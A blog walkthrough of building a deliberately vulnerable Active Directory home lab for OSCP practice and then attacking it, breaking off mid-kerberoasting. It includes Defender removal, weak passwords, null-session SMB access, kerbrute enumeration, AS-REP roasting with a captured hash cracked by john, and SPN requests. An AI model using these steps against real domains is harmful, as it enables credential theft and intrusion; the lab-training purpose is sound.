---
title: Active Directory (OSCP Like) - Home Laboratory
date: 2023-06-12
categories: [Certifications, OSCP]
tags: [Windows, Active Directory]
---

![](/assets/img/OSCP/1.png)

---

Hey! How are you doing? Today we're going to be solving an **Active Directory** home laboratory. In this lab we are going to be seeing and exploiting some of the attacks you may need to perform in the **OSCP** certification. We are going to be performing the attacks shown in my last [Active Directory post](https://ruycr4ft.github.io/posts/ActiveDirectory-notes/), but I am also going to be explaining some new ones, such as **Privileges escalations** and **Silver Ticket Attack**. Let's sotp talking and let's go hands-on-lab!

> I am not certified on this **Offensive Security** certification, I am just studing for it.
{: .prompt-warning }

# Setting up the lab
---

These kind of labs can be very demanding when we talk about **hardware** requirements. In total we need to fire up **four** windows machines, one **Windows Server 2019**, two **Windows Enterprise** machines and one **Windows 7 Proffesional**. Here are the **hardware requirements**:

- **Minimum hardware requirements**:
    + 8GB RAM
    + 4 Core CPU
    + 15GB hard disk space for each machine

- **Recommended hardware requirements**:
    + 16GB RAM
    + 6-8 Core CPU
    + 25GB hard disk space for each machine

## Installing Windows
---

### DC-Company
---

I am going to use **VirtualBox**, but you can use **VMWare**.
First we are going to start by creating a new machine, call it as you want:

![](/assets/img/OSCP/67.png)

Now click on **Next** and assign all the RAM and CPU cores you want; I recommend at least 2GB of RAM and one core:

![](/assets/img/OSCP/68.png)

Click on **Next** and assing the amount of disk space you want to give to the machine. I recommend at least 15GB, but I am going to assing to it 20GB:

![](/assets/img/OSCP/69.png)

Click on **Next** and then on **Finish**. Then, change the network adapter to bridged and set **Allow everything**:

![](/assets/img/OSCP/70.png)

Run the **VM**, and this is a normal Windows installation. The only thing that changes is that you need to select **Desktop Experience** on Windows Edition:

![](/assets/img/OSCP/71.png)

Now install Windows normally!

### SRomero-PC & VCano-PC
---

Because this is a Windows Enterprise edition, is like installing normal Windows 10; even that, I am going to explain it:

First, create a new VM, select the ISO, assing the amount of resources you want to install to each VM (I recommend at least 2GB of RAM and 20GB of disk). Then, install windows normally.

>Don't use a Microsoft accound when you install Windows, use a local account.
{: .prompt-warning }

## Settings: Domain Controller
---

### Creating a new domain controller
---

To make the Windows Server act like a **Domain Controller**, we first need to install the **Active Directory** modules:

- First, click on **'Add roles and features'**:

![](/assets/img/OSCP/72.png)

Then click on **'Next'**, again **'Next'**. Then, mark the box that says **'Active Directory Domain Services`**:

![](/assets/img/OSCP/73.png)

Click always **'Next'** and then, click on **'Install'**:

![](/assets/img/OSCP/74.png)

There are some companies that use computer names such as **DC-Company** or **SQL-Server**, which give the attackers big hints to know where the **database** server or the **Domain Controller** is located. Well, we are not going to do less, so after the installation is complete we must access **Windows Explorer**. After that, go to **My Computer** and **right click**. Then, click on **Properties**.

![](/assets/img/OSCP/99.png)

After that is done, **don't click on Restart Now**, because we need to something else that also needs a restart, so let's save some time and do only **one restart**. 
Now, you must go to **Server Manager** and click on the **flag icon**:

![](/assets/img/OSCP/100.png)

Then, click on **Promote this server to a domain controller**. Then we'll select **Add a new forest** and input the domain.

![](/assets/img/OSCP/101.png)

After that, click on **Next** and set the **password**:

![](/assets/img/OSCP/102.png)

Now click on **Next**, **Next**, etc, and then click on **Install**.

![](/assets/img/OSCP/103.png)

Once this is complete, it will restart automatically.

### Creating users
---

Here we are going to create **three** users: **vcano**, **sromero** and **svc_sql**. The user **sromero** will have **Administrator** privileges over the **vcano** user.
First we must go to **Server Manager** and click on **Tools**. After that, select **Active Directory Users and Computers**. 
Now click on the following icon and fill the **user** info:

![](/assets/img/OSCP/104.png)

Click on **Next** and set a password for the user. I will use **"Password1"**. Then, select **Password never expires**. Repeat the process for user **vcano** and **svc_sql**.
Now we must add the users **sromero** and **vcano** to the **RemoteManagementGroup**:

![](/assets/img/OSCP/105.png)

## Settings: Vulnerabilities
---

First we must open the **PowerShell ISE** and execute `Uninstall-WindowsFeature -Name Windows-Defender`. Then restart the server.

### AS-REP Roast
---

We'll make the user **svc_sql** vulnerable to this attack. For that, we only need to **right-click** on the account and in the **Account** tab, select **Do not require kerberos preauthentication**:

![](/assets/img/OSCP/106.png)

Now click on **Apply** and **OK**. After that, go to **C$** and create a new folder called **Employees**. Here add a file called **employee_sheet.txt** with all the usernames of the system. Now **right-click** the folder and select **Propierties**. Then click on **Share** and allow to **READ** everyone. This will allow us to get the neccessary information to perform the **AS-REP Roast** attack, because if you remember, in this attack we **need** a list of valid usernames. Of course, you can do other thecnique to share the usernames, I am going to go to the simplest way so this post doesn't last until I get bierd xD

### Kerberoasting
---

For this vulnerability we are going to expose the users **sromero** and **vcano**:

![](/assets/img/OSCP/10.png)

### Privileges escalations
---

Now we need to set up the vulnerabilities for the **Privilege escalation**. We are going to start on giving the user **vcano** the **SeImpersonatePrivilege**. To perform this, we must open **Start** and search for **Local Policy**. Then press **Enter**, go to **Local Policies** and then **User Rights Assignment**. Then select **Impersonate a client after authentication** and add the user **vcano** to this group. 

![](/assets/img/OSCP/14.png)

After that, we are going to give the user **sromero** the privilege **SeBackupPrivilege**. To achieve this, we must go **Active Directory Users and Computers** and **right-click** the **sromero** user. Then, click on **Add to group** and type **Backup Operators**:

![](/assets/img/OSCP/26.png)

Now we need to copy the **Administrator** user and name it as **backup**. Then assing to it the password **Password4**.

## Settings: User's computers
---

### SRomero-PC & VCano-PC
---

These two computers are configured the same, the only difference is that **sromero** has **Administrator** privileges over **vcano**, and that the **SRomero-PC** has a **python script**, which makes this machine vulnerable to **SMB Relay**. However, I will put everything in the same point. The script is pretty simple:

```python
import os
import time

def check_network_resource():
    network_path = r'\\SQL_Server\database.json'
    if os.path.exists(network_path):
        print("Successfully accessed database.json")
    else:
        print("Failed to access database.json")

def main():
    while True:
        try:
            check_network_resource()
        except Exception as e:
            print("Error while verifying signature", str(e))
        time.sleep(300)  

if __name__ == "__main__":
    main()
```

Save this script, and compile it with `auto-py-to-exe` in your **Linux** machine. Then, press **Windows + R** and type **shell:startup**. Then press **Enter** and move the `.exe` file into that folder. Now, when you start this machine, it will automatically start this program. 
Now, to give **sromero** the **Administrator** privileges over the **VCano-PC**, we first must go to the **VCano-PC** and open **Start**. Then search for **grous** and click on the first result. Now go to **Groups** and click on the **Administrators** one. Then, click on **Add** and add the **sromero@paif.local** account. It shoul look like this:

![](/assets/img/OSCP/42.png)

Now, we must open **Start** and search for **work**. Press **Enter** and follow the steps to connect the computer to the **Domain**: **paif.local**. This process is the same on the **VCano-PC** and the **SRomero-PC**.

### CCrespo-PC
---

This computer is a **Windows 7 x64** machine. Just for the version of **Windows**, we can deduce that this machine is going to be target of the vulnerability **MS17-010**. However, we need to expose the port **445** (SMB). 
First we need to right-click on the ethernet icon. After that, click on **Change adapter settings**. Then, click on **Properties** and use the **Domain Controller's** IP:

![](/assets/img/OSCP/85.png)

After that, open **Start** and search for **Join a domain**. Open it, and click on **Change**, then connect it to the **Domain Controller**:

![](/assets/img/OSCP/86.png)

This will ask for a password of a user, so let's create the user **ccrespo** with the password **Password5**:

![](/assets/img/OSCP/87.png)

Now use that username and password to connect to the **Domain Controller**. After that, restart the machine. As you can notice, the next time you login, you are not login at **local** level. You are login in the domain **paif.local**! We can notice that, if we try to run something as **Administrator**, it will ask its password:

![](/assets/img/OSCP/89.png)

Ok, now its connected to the **Domain Controller**, we must expose the port **445** so its vulnerable to **EternalBlue** (MS17-010).
First we must open the **Windows Firewall** as **Administrator**. Then input the **Administrator's** credentials, and create a new **Inbound Rule**:

![](/assets/img/OSCP/90.png)

Here we've selected the **Port** rule. Now click on **Next** and enter the port **445**:

![](/assets/img/OSCP/91.png)

Click on **Next**, then **Allow the connection**, select all the boxes in the next panel, and then add a new name to the rule. I am going to call it **Ports**. Repeat the same in **OutBound Rules**. Now we can check if everything went well with the `nmap` script **"vuln and safe"**:

![](/assets/img/OSCP/92.png)

Perfect! Its vulnerable to this attack!

# Pwning - DC-Company
---

![](/assets/img/OSCP/2.png)

---

## Enumeration
---

### CrackMapExec 
---

In order to pwn this **Domain Controller**, we can perform **multiple** attacks, but as in **all** AD environments, we are going to start by enumerating the computers on the network with the alredy used tool, `crackmapexec`:

```zsh
❯ cme smb 192.168.0.1/24
SMB         192.168.0.107   445    DC-COMPANY       [*] Windows 10.0 Build 17763 x64 (name:DC-COMPANY) (domain:paif.local) (signing:True) (SMBv1:False)
SMB         192.168.0.123   445    SROMERO-PC       [*] Windows 10.0 Build 19041 x64 (name:SROMERO-PC) (domain:paif.local) (signing:False) (SMBv1:False)
SMB         192.168.0.112   445    VCANO-PC         [*] Windows 10.0 Build 19041 x64 (name:VCANO-PC) (domain:paif.local) (signing:False) (SMBv1:False)
```

Here we can see **three** computers connected to the domain **paif.local**. We also can see a computer called **DC-COMPANY**, with the IP **192.168.0.107**. If we check our connectivity to the domain **paif.local**, we can see that we can't reach it, but this is easy to fix. We only need to add the domain into the `/etc/hosts` file, with the corresponding IP address:

![](/assets/img/OSCP/4.png)

Now if we **ping** the domain we can notice that we are reaching it:

```zsh
❯ ping -c 1 paif.local
PING paif.local (192.168.0.107) 56(84) bytes of data.
64 bytes from paif.local (192.168.0.107): icmp_seq=1 ttl=128 time=0.243 ms

--- paif.local ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.243/0.243/0.243/0.000 ms
```

### Nmap 
---

This is not only applicable **Windows** machines, this is a thing that you must perform in **all** machines that you are trying to pwn, you know what I mean right? Yeap, `nmap`:

```zsh
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.0.107 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 16:50 CEST
Initiating ARP Ping Scan at 16:50
Scanning 192.168.0.107 [1 port]
Completed ARP Ping Scan at 16:50, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:50
Scanning 192.168.0.107 [65535 ports]
Discovered open port 443/tcp on 192.168.0.107
Discovered open port 135/tcp on 192.168.0.107
Discovered open port 139/tcp on 192.168.0.107
Discovered open port 80/tcp on 192.168.0.107
Discovered open port 445/tcp on 192.168.0.107
Discovered open port 3389/tcp on 192.168.0.107
Discovered open port 53/tcp on 192.168.0.107
Discovered open port 49667/tcp on 192.168.0.107
Discovered open port 3268/tcp on 192.168.0.107
Discovered open port 389/tcp on 192.168.0.107
Discovered open port 5985/tcp on 192.168.0.107
Discovered open port 464/tcp on 192.168.0.107
Discovered open port 636/tcp on 192.168.0.107
Discovered open port 47001/tcp on 192.168.0.107
Discovered open port 49669/tcp on 192.168.0.107
Discovered open port 49665/tcp on 192.168.0.107
Discovered open port 49671/tcp on 192.168.0.107
Discovered open port 3269/tcp on 192.168.0.107
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.0.107 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 16:57 CEST
Initiating ARP Ping Scan at 16:57
Scanning 192.168.0.107 [1 port]
Completed ARP Ping Scan at 16:57, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:57
Scanning 192.168.0.107 [65535 ports]
Discovered open port 445/tcp on 192.168.0.107
Discovered open port 80/tcp on 192.168.0.107
Discovered open port 139/tcp on 192.168.0.107
Discovered open port 3389/tcp on 192.168.0.107
Discovered open port 53/tcp on 192.168.0.107
Discovered open port 135/tcp on 192.168.0.107
Discovered open port 443/tcp on 192.168.0.107
Discovered open port 60315/tcp on 192.168.0.107
Discovered open port 593/tcp on 192.168.0.107
Discovered open port 49670/tcp on 192.168.0.107
Discovered open port 49669/tcp on 192.168.0.107
Discovered open port 49674/tcp on 192.168.0.107
Discovered open port 3269/tcp on 192.168.0.107
Discovered open port 49664/tcp on 192.168.0.107
Discovered open port 42/tcp on 192.168.0.107
Discovered open port 636/tcp on 192.168.0.107
Discovered open port 88/tcp on 192.168.0.107
Discovered open port 49665/tcp on 192.168.0.107
Discovered open port 49671/tcp on 192.168.0.107
Discovered open port 49667/tcp on 192.168.0.107
Discovered open port 49679/tcp on 192.168.0.107
Discovered open port 5357/tcp on 192.168.0.107
Discovered open port 47001/tcp on 192.168.0.107
Discovered open port 3268/tcp on 192.168.0.107
Discovered open port 49688/tcp on 192.168.0.107
Discovered open port 49677/tcp on 192.168.0.107
Discovered open port 5985/tcp on 192.168.0.107
Discovered open port 49666/tcp on 192.168.0.107
Discovered open port 464/tcp on 192.168.0.107
Discovered open port 9389/tcp on 192.168.0.107
Discovered open port 49673/tcp on 192.168.0.107
Discovered open port 389/tcp on 192.168.0.107
Completed SYN Stealth Scan at 16:58, 12.67s elapsed (65535 total ports)
Nmap scan report for 192.168.0.107
Host is up, received arp-response (0.00026s latency).
Scanned at 2023-06-12 16:57:53 CEST for 13s
Not shown: 58062 closed tcp ports (reset), 7441 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
42/tcp    open  nameserver       syn-ack ttl 128
53/tcp    open  domain           syn-ack ttl 128
80/tcp    open  http             syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
443/tcp   open  https            syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
3389/tcp  open  ms-wbt-server    syn-ack ttl 128
5357/tcp  open  wsdapi           syn-ack ttl 128
5985/tcp  open  wsman            syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
47001/tcp open  winrm            syn-ack ttl 128
49664/tcp open  unknown          syn-ack ttl 128
49665/tcp open  unknown          syn-ack ttl 128
49666/tcp open  unknown          syn-ack ttl 128
49667/tcp open  unknown          syn-ack ttl 128
49669/tcp open  unknown          syn-ack ttl 128
49670/tcp open  unknown          syn-ack ttl 128
49671/tcp open  unknown          syn-ack ttl 128
49673/tcp open  unknown          syn-ack ttl 128
49674/tcp open  unknown          syn-ack ttl 128
49677/tcp open  unknown          syn-ack ttl 128
49679/tcp open  unknown          syn-ack ttl 128
49688/tcp open  unknown          syn-ack ttl 128
60315/tcp open  unknown          syn-ack ttl 128
MAC Address: 08:00:27:E3:41:E6 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.90 seconds
           Raw packets sent: 86931 (3.825MB) | Rcvd: 58095 (2.324MB)
```

As always we are going to perform a new scan of those ports, but this time we are going to use `nmap` scripts so we can know the name of the service and the version of it running in each port:

```zsh
❯ nmap -sCV -p42,53,80,88,135,139,389,443,445,464,593,636,3268,3269,3389,5357,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49673,49674,49677,49679,49688,60315 192.168.0.107 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 16:59 CEST
Nmap scan report for paif.local (192.168.0.107)
Host is up (0.0021s latency).

PORT      STATE SERVICE       VERSION
42/tcp    open  tcpwrapped
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Our Employees
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-12 14:59:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: paif.local0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: 2023-06-12T15:00:52+00:00; 0s from scanner time.
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Our Employees
| ssl-cert: Subject: commonName=DC-Company.paif.local
| Not valid before: 2023-06-10T14:26:27
|_Not valid after:  2023-12-10T14:26:27
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: paif.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-06-12T15:00:52+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC-Company.paif.local
| Not valid before: 2023-06-09T18:38:54
|_Not valid after:  2023-12-09T18:38:54
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
60315/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:E3:41:E6 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC-COMPANY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC-COMPANY, NetBIOS user: <unknown>, NetBIOS MAC: 080027e341e6 (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2023-06-12T15:00:45
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.92 seconds
```

Here we can see a bunch of ports, but because this is an **Active Directory** enviroment, we only need to focus on the following ports:

- 88 -> **Kerberos**
- 389 -> **LDAP**
- 445 -> **SMB**
- 5985 -> **WinRM**

## Foothold
---

### SMB
---

As we saw in the last `nmap` report, the port **445** was open, so that means that a **SMB** service is running. We can use `smbclient` to list the **shared folders**:

```zsh
❯ smbclient -N -L //192.168.0.107 -smb2support
Can't load mb2support - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Members         Disk      List of employees on PaiF
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Interesting. Here we can see a share called **Members**, with a description that says **'List of employees on PaiF'**. This sounds interesting, because maybe some employees are valid-system users, and remember that when we have a **list of valid users** on an **Active Directory** environment, we can easily perform an **AS-REP Roast** attack. 
Let's access that share:

```zsh
❯ smbclient -N //192.168.0.107/Members -smb2support
Can't load mb2support - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun 11 15:18:11 2023
  ..                                  D        0  Sun Jun 11 15:18:11 2023
  employee_sheet.txt                  A      447  Sat Jun 10 17:21:25 2023

		10344447 blocks of size 4096. 6307577 blocks available
smb: \> get employee_sheet.txt
getting file \employee_sheet.txt of size 447 as employee_sheet.txt (62,4 KiloBytes/sec) (average 62,4 KiloBytes/sec)
smb: \> exit
```

You may wander **why we can access** that share if we didn't input any username or password. Well, this is called **Null Session**, and to successfully access a share with it (**Null Session**), the share must be setted up like this:

![](/assets/img/OSCP/7.png)

Here we can see that this share is allowing access to **read and execute** to **everyone**.

### Kerbrute - Getting all valid usernames
---

This seems interesting, we have list of employees, so let's see its content:

![](/assets/img/OSCP/5.png)

Here we have the names of the employees, with their suposed **usernames**. Note that if we only get a list of members (not usernames) we could use the tool [namemash.py](https://raw.githubusercontent.com/krlsio/python/main/namemash.py) to create a list of usernames. Let's supose that this list only contains the names of the employees, not the usernames. The list would look something like this:

![](/assets/img/OSCP/6.png)

With `namemash.py` we can indicate the **text file** with the names of the employees:

```zsh
❯ python3 namemash.py employee_sheet.txt > users
```

This will put the output of the program on a file called **users**. Now, we can use `kerbrute` to check which of them are valid on the **Domain Controller**:

```zsh
❯ ./kerbrute userenum users --dc dc.paif.local -d paif.local

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/12/23 - Ronnie Flathers @ropnop

2023/06/12 17:55:26 >  Using KDC(s):
2023/06/12 17:55:26 >  	dc.paif.local:88

2023/06/12 17:55:26 >  [+] VALID USERNAME:	vcano@paif.local
2023/06/12 17:55:26 >  [+] VALID USERNAME:	sromero@paif.local
2023/06/12 17:55:26 >  Done! Tested 198 usernames (2 valid) in 0.119 seconds
```

>**Note:** You will need to add **dc.paif.local** into the same line in the `/etc/hosts`.

Ok, so we can see that the usernames **vcano** and **sromero** are valid, but there is maybe other users such as **svc_something**, so we can use again `kerbrute`, but this time we are going to use a list from **SecLists**:

```zsh
❯ ./kerbrute userenum /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt --dc dc.paif.local -d paif.local

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/12/23 - Ronnie Flathers @ropnop

2023/06/12 18:10:03 >  Using KDC(s):
2023/06/12 18:10:03 >  	dc.paif.local:88

2023/06/12 18:10:03 >  [+] VALID USERNAME:	guest@paif.local
2023/06/12 18:10:04 >  [+] VALID USERNAME:	administrator@paif.local
2023/06/12 18:10:04 >  [+] VALID USERNAME:	backup@paif.local
2023/06/12 18:10:10 >  [+] VALID USERNAME:	Guest@paif.local
2023/06/12 18:10:10 >  [+] VALID USERNAME:	Administrator@paif.local
2023/06/12 18:10:10 >  [+] VALID USERNAME:	svc_sql@paif.local
2023/06/12 18:10:30 >  [+] VALID USERNAME:	GUEST@paif.local
2023/06/12 18:11:51 >  [+] VALID USERNAME:	Backup@paif.local
2023/06/12 18:12:15 >  [+] VALID USERNAME:	sromero@paif.local
```

Nice! Here we are seeing a few more usernames: **administrator** (quite obvious), **guest** (again, quite obvious), **backup** (seems interesting) and **svc_sql** (it also seems interesting). With these **usernames** we can make a list, and try to **AS-REP Roast** them.

### AS-REP Roast - Getting some passwords
---

As I said earlier, to successfully **AS-REP Roast** a user we only need that the **Do not require Kerberos pre-authentication** box is marked:

![](/assets/img/OSCP/8.png)

With only this enabled, we can easily use `impacket-GetNPUsers` to retrive the tikets of all the **roasteable** users:

```zsh
❯ impacket-GetNPUsers paif.local/ -no-pass -usersfile validUsers
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User sromero doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User vcano doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc_sql@PAIF.LOCAL:9b0e862d8f2b53a70a2314636ac332fe$e9e3e5dc45386cb13ac9c0718a86603791e4ab196045640aac9c2deb624cb5bfbe7af2d54c59f170bfbb1b761267e2d454d9f78ae1cf957ef2be8a18056b4221c617117e81719255776a607e6073033953cdcbe03fb4c7fbaef6c207cd86963ddc707815538f7f0ab70b496099ed789e2124706af5cf7300c271feeed7074a2728d92842dc6b2fa7d9a48d538e1f1e32eca534253c578c78d30e187b424bd3b80e6665809d315c94ab042e7672cf7535bd67e2ed951d22c57bade88670d8e55f5189d0b70c7b22ac1593c5d797cb4f4b72c28431568e2b61b58c03e3e36280b9355ad111b7921bbd
[-] User guest doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Nice! Here we can see that we've successfully obtained the hash of the user **svc_sql**, but we want to know how this attack works:

![](/assets/img/OSCP/9.png)

What I am trying to show in this schema is that when **Preathentication** is enabled, a user who needs to access a resource begins the **Kerberos authentication** process by sending an **AS-REQ** (Authentication Server Request) message to the **Domain Controller**. What the response **AS-REP** (Authentication Server Response) contains is the hash of the user that made the request, that's why we don't need their passwords for this attack. If the password is weak, we'll be able to crack it using the famous tool `john`. If it isn't, we would need to find other vulnerable vectors. First of all, let's try to crack it:

```zsh
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
summer2005#      ($krb5asrep$23$svc_sql@PAIF.LOCAL)     
1g 0:00:00:05 DONE (2023-06-12 19:01) 0.2000g/s 697548p/s 697548c/s 697548C/s summeralexis..sumi115
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Here we can see that the password **is weak**, and we've been able to crack it. First of all, let's check if we can connect to the **Domain Controller** with these credentials:

```zsh
❯ evil-winrm -i paif.local -u svc_sql -p summer2005#
Evil-WinRM shell v3.4
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

Ok, so we aren't able to connect with this user to the **Domain Controller**. This must be because the user **svc_sql** doesn't belong the **Remote Management Users**. This could be enabled by running this command on the **Command Prompt Line** (CMD): `net localgroup "Remote Management Users" {user} /add`. But we are not going to execute that because there is **two other paths** to pwn the machine. 

### Kerberoasting - Getting user's passwords
---

If you read my **Active Directory** post you will remember that when we have **any** user's credentials, we can perfomr a **Kerberoasting attack**. In an environment like this, which is using **Kerberos**, each user has an associated service account (**SPNs** -> Service Principal Names) which uniquely identifies services registered in the **Domain Controller**:

```zsh
❯ impacket-GetUserSPNs paif.local/svc_sql:summer2005#
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName           Name     MemberOf                                                PasswordLastSet             LastLogon                   Delegation 
-----------------------------  -------  ------------------------------------------------------  --------------------------  --------------------------  ----------
paif.local/sromero.DC-Company  sromero  CN=DnsAdmins,CN=Users,DC=paif,DC=local                  2023-06-10 12:19:21.812923  2023-06-12 16:44:15.351540             
paif.local/vcano.DC-Company    vcano    CN=Remote Management Users,CN=Builtin,DC=paif,DC=local  2023-06-10 12:19:21.954247  2023-06-12 16:47:11.429888 
```

Once we have a list of these **SPNs**, we can request a **Service Ticket** (TGS) for each of these accounts. A **TGS** is a cryptographic ticket that is used by **KDC** (Key Distribution Center). This ticket is bassically the user's password, encrypted. So, if the password is weak, we could try to crack it:

```zsh
❯ impacket-GetUserSPNs paif.local/svc_sql:summer2005# -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName           Name     MemberOf                                                PasswordLastSet             LastLogon                   Delegation 
-----------------------------  -------  ------------------------------------------------------  --------------------------  --------------------------  ----------
paif.local/sromero.DC-Company  sromero  CN=DnsAdmins,CN=Users,DC=paif,DC=local                  2023-06-10 12:19:21.812923  2023-06-12 16:44:15.351540             
paif.local/vcano.DC-Company    vcano    CN=Remote Management Users,CN=Builtin,DC=paif,DC=local  2023-06-10 12:19:21.954247  2023-06-12 16:47:11.429888             



[-] CCache file is not found. Skipping...
